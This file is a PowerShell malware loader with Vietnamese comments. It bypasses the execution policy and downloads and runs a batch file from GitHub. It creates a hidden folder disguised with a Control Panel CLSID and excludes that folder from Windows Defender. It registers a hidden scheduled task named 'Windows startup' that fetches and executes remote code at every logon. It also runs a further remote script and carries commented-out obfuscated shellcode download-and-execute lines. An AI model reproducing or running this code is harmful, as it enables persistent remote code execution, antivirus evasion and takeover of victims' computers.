



Set-ExecutionPolicy Bypass -Scope Process -Force

$skid = "skid"

# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        $outputFile = "$env:TEMP\download.bat"
        
        Write-Output "Tải xuống tệp từ $url"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop

        # Kiểm tra xem tệp đã được tải xuống thành công không
        if (-not (Test-Path $outputFile)) {
            throw "Tệp tải xuống không tồn tại: $outputFile"
        }

        # Thực thi tệp batch mà không cần quyền quản trị
        Write-Output "Khởi chạy tệp batch."
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}


$rdir = "C:\Users\hai1723"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -ep bypass -c ""iwr https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -useb | iex"""
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable


try {
    # Thử đăng ký tác vụ theo lịch
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
    Write-Output "Tác vụ theo lịch đã được đăng ký thành công."
}
catch {
    # Xử lý lỗi nếu có và thực hiện lệnh thay thế
    Write-Error "Lỗi xảy ra khi đăng ký tác vụ theo lịch: $_"
    
    # Thực thi lệnh thay thế
    Write-Output "Thực thi lệnh thay thế từ hai1723.com/fix.ps1"
    try {
        Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$temp\aka.exe"
        Start-Process -FilePath '$temp\aka.exe'
        Write-Output "Lệnh thay thế đã được thực thi thành công."
    }
    catch {
        Write-Error "Lỗi xảy ra khi thực thi lệnh thay thế: $_"
    }
}
finally {
    # Đoạn mã này luôn được thực thi, bất kể có lỗi hay không
    Write-Output "Hoàn tất quy trình đăng ký tác vụ hoặc thực thi lệnh thay thế."
}

Write-Host "[!] Persistence Added" -ForegroundColor Green

iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt |iex



# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
# }





Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}
